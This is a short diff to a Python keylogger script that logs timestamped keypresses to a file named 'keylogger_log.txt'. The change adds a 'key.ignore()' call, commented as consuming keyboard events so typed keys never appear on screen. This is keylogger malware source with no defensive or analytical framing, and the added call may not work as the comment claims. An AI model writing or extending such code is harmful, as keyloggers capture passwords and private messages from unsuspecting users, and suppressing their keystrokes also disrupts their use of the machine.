@@ -8,6 +8,9 @@ log_file_path = "keylogger_log.txt"
 
 # Defines the keylogger function
 def keylogger(key):
+    # Consume the keyboard event to prevent it from being displayed on the screen
+    key.ignore()
+
     # Format the timestamp and key press event
     timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
     event = f"{timestamp} - {key}\n"
